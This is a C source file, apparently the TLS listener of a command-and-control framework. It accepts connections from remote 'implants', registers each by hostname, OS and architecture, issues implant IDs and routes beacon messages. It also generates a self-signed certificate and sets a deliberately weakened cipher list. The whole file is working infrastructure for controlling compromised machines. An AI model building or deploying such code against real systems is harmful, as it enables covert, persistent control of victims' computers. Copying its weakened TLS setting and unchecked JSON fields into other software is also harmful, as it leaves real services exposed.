#include "tcp_ssl.h"

#include <openssl/evp.h>
#include <openssl/x509v3.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/x509.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <openssl/param_build.h>
#include <openssl/core_names.h> 
#include <openssl/sslerr.h>

#include <sys/stat.h>
#include <sys/types.h>
#include <stdio.h>
#include <cjson/cJSON.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <time.h>
#include <pthread.h>

#include "beacon_tcp_ssl.h"
#include "agent.h"

struct tcp_ssl_thread_args {
    SSL_CTX *ctx;
    int client_fd;
    char ip[INET_ADDRSTRLEN];
};


#define BUFFER_SIZE 4096
#define MAX_RESPONSE 0x20000


//void generate_key_and_cert();


void init() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms(); 
    ERR_load_crypto_strings();
}
void ssl_register_agent(cJSON *json, char* ip, SSL *ssl) {
    cJSON *hostname =  cJSON_GetObjectItem(json, "hostname");
    cJSON *os =  cJSON_GetObjectItem(json, "os");
    cJSON *arch = cJSON_GetObjectItem(json, "arch");

    char input[255];
    snprintf(input, sizeof(input), "%s-%s-%s-TCP-SSL", hostname->valuestring, os->valuestring, arch->valuestring);
    char implant_id[65];
    GenerateID(input, implant_id);

    // check if id already exists in database
    if (check_implant_id(implant_id) == 1) {
        log_message(LOG_INFO, "Implant ID exists (TCP SSL): implant_id = %s", implant_id);
        goto REPLY;
    };


    log_message(LOG_INFO, "New Implant Registration (TCP SSL): implant_id = %s, hostname = %s, os = %s, arch = %s", implant_id,  hostname->valuestring, os->valuestring, arch->valuestring);

    // register to datbase (implant_id, os, ip, mac, hostname)
    // check if agent id exists
    struct db_agents args;
    strncpy(args.implant_id, implant_id, sizeof(args.implant_id) - 1);
    args.implant_id[sizeof(args.implant_id) - 1] = '\0';
    strncpy(args.os, os->valuestring, sizeof(args.os) - 1);
    args.os[sizeof(args.os) - 1] = '\0';
    strncpy(args.ip, ip, sizeof(args.ip) - 1);
    args.ip[sizeof(args.ip) - 1] = '\0';
    strncpy(args.hostname, hostname->valuestring, sizeof(args.hostname) - 1);
    args.hostname[sizeof(args.hostname) - 1] = '\0';

    strncpy(args.arch, arch->valuestring, sizeof(args.arch) - 1);
    args.arch[sizeof(args.arch) - 1] = '\0';

    new_implant(args);

    // reply with agent id
    REPLY:
    cJSON *json_reply = cJSON_CreateObject();
    cJSON_AddStringToObject(json_reply, "mode", "ack");
    cJSON_AddStringToObject(json_reply, "implant_id", implant_id);

    char *reply = cJSON_Print(json_reply);
    //send(sock, reply, strlen(reply), 0);
    if (SSL_write(ssl, reply, strlen(reply)) == 0) {
        log_message(LOG_ERROR, "SSL Write error");
    }

    free(reply);
    cJSON_Delete(json_reply);
}

void *tcp_ssl_agent_handler(void *args) {
    struct tcp_ssl_thread_args *arg = (struct tcp_ssl_thread_args*)args;
    SSL_CTX *ctx  = arg->ctx;
    int client_fd = arg->client_fd;

    SSL *ssl = SSL_new(ctx);
    if (!ssl) {
        fprintf(stderr, "[!] SSL_new failed\n");
        close(client_fd);
        free(arg);
        return NULL;
    }

    if (SSL_set_fd(ssl, client_fd) != 1) {
        fprintf(stderr, "[!] SSL_set_fd failed\n");
        SSL_free(ssl);
        close(client_fd);
        free(arg);
        return NULL;
    }

    if (SSL_accept(ssl) != 1) {
        fprintf(stderr, "[!] SSL_accept failed\n");
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        close(client_fd);
        free(arg);
        return NULL;
    }

    char buffer[BUFFER_SIZE];
    int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1);
    if (bytes_received <= 0) {
        fprintf(stderr, "[!] SSL_read failed\n");
        ERR_print_errors_fp(stderr);
        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(client_fd);
        free(arg);
        return NULL;
    }
    buffer[bytes_received] = '\0';

    cJSON *json = cJSON_Parse(buffer);
    if (!json) {
        fprintf(stderr, "[!] Error parsing JSON\n");
        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(client_fd);
        free(arg);
        return NULL;
    }

    cJSON *type = cJSON_GetObjectItem(json, "mode");
    if (!type) {
        fprintf(stderr, "[!] No mode in JSON\n");
    } else if (strcmp(type->valuestring, "register") == 0) {
        ssl_register_agent(json, arg->ip, ssl);
    } else if (strcmp(type->valuestring, "beacon") == 0) {
        ssl_beacon(json, ssl);
    } else if (strcmp(type->valuestring, "session") == 0) {
        // session handling here
    }

    cJSON_Delete(json);
    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(client_fd);
    free(arg);
    return NULL;
}

// Listener: accepts TCP connections and spawns SSL threads
void* tcp_ssl_listener(void *args) {
    struct Args_t {
        char cert[BUFFER_SIZE];
        char key[BUFFER_SIZE];
        int port;
    };

    struct Args_t *Args = (struct Args_t*)args;
    char cert[BUFFER_SIZE], key[BUFFER_SIZE];
    int PORT = Args->port;
    strncpy(cert, Args->cert, BUFFER_SIZE);
    strncpy(key, Args->key, BUFFER_SIZE);
    free(args);

    // create TCP socket
    int serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock < 0) { log_message(LOG_ERROR, "Socket creation failed (TCP, SSL)"); return NULL; }

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);

    if (bind(serverSock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        log_message(LOG_ERROR, "Binding Failed | Port : %d", PORT); close(serverSock); return NULL;
    }

    if (listen(serverSock, SOMAXCONN) < 0) {
       log_message(LOG_ERROR, "Listen failed | Port : %d", PORT); close(serverSock); return NULL;
    }

    // SSL context
    const SSL_METHOD *method = TLS_server_method();
    SSL_CTX *ctx = SSL_CTX_new(method);
    if (!ctx) { log_message(LOG_ERROR, "Failed to create SSL ctx "); return NULL; }
    SSL_CTX_set_cipher_list(ctx, "ALL:@SECLEVEL=0"); // debugging only

    if (SSL_CTX_use_certificate_file(ctx, cert, SSL_FILETYPE_PEM) <= 0 ||
        SSL_CTX_use_PrivateKey_file(ctx, key, SSL_FILETYPE_PEM) <= 0) {
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(ctx);
        return NULL;
    }

    while (1) {
        struct sockaddr_in client_addr;
        socklen_t len = sizeof(client_addr);
        int agentSock = accept(serverSock, (struct sockaddr*)&client_addr, &len);
        if (agentSock < 0) { perror("Accept failed"); continue; }

        struct tcp_ssl_thread_args *args = malloc(sizeof(*args));
        args->ctx = ctx;
        args->client_fd = agentSock;
        strcpy(args->ip, inet_ntoa(client_addr.sin_addr));

        pthread_t thread;
        if (pthread_create(&thread, NULL, tcp_ssl_agent_handler, args) < 0) {
            perror("Thread creation failed");
            close(agentSock);
            free(args);
            continue;
        }
        pthread_detach(thread);
    }

    close(serverSock);
    SSL_CTX_free(ctx);
    return NULL;
}



void generate_key_and_cert(char *cert, char *key) {
    EVP_PKEY *pkey = NULL;
    EVP_PKEY_CTX *ctx = NULL;
    X509 *x509 = NULL;
    FILE *key_file = NULL, *cert_file = NULL;

    // Optional: Create directory if needed
    mkdir("certs", 0700);

    ctx = EVP_PKEY_CTX_new_from_name(NULL, "RSA", NULL);
    if (!ctx || EVP_PKEY_keygen_init(ctx) <= 0 ||
        EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, 2048) <= 0 ||
        EVP_PKEY_keygen(ctx, &pkey) <= 0) {
        fprintf(stderr, "Failed to generate RSA key\n");
        goto cleanup;
    }

    x509 = X509_new();
    if (!x509) {
        fprintf(stderr, "Failed to create X509 structure\n");
        goto cleanup;
    }

    X509_set_version(x509, 2);
    ASN1_INTEGER_set(X509_get_serialNumber(x509), 1);
    X509_gmtime_adj(X509_get_notBefore(x509), 0);
    X509_gmtime_adj(X509_get_notAfter(x509), 365 * 24 * 60 * 60);

    X509_set_pubkey(x509, pkey);

    X509_NAME *name = X509_get_subject_name(x509);
    X509_NAME_add_entry_by_txt(name, "C", MBSTRING_ASC, (unsigned char *)"SA", -1, -1, 0);
    X509_NAME_add_entry_by_txt(name, "O", MBSTRING_ASC, (unsigned char *)"MyOrg", -1, -1, 0);
    X509_NAME_add_entry_by_txt(name, "CN", MBSTRING_ASC, (unsigned char *)"localhost", -1, -1, 0);
    X509_set_issuer_name(x509, name);

    if (!X509_sign(x509, pkey, EVP_sha256())) {
        fprintf(stderr, "Failed to sign certificate\n");
        goto cleanup;
    }

    printf("Saving key to: %s\n", key);
    key_file = fopen(key, "wb");
    if (!key_file) {
        perror("Failed to open key file");
        goto cleanup;
    }
    if (!PEM_write_PrivateKey(key_file, pkey, NULL, NULL, 0, NULL, NULL)) {
        fprintf(stderr, "Failed to write private key\n");
    }
    fclose(key_file);

    printf("Saving cert to: %s\n", cert);
    cert_file = fopen(cert, "wb");
    if (!cert_file) {
        perror("Failed to open cert file");
        goto cleanup;
    }
    if (!PEM_write_X509(cert_file, x509)) {
        fprintf(stderr, "Failed to write certificate\n");
    }
    fclose(cert_file);

    printf("Key and certificate successfully generated (OpenSSL 3.0+ compliant)\n");

cleanup:
    if (ctx) EVP_PKEY_CTX_free(ctx);
    if (pkey) EVP_PKEY_free(pkey);
    if (x509) X509_free(x509);
}
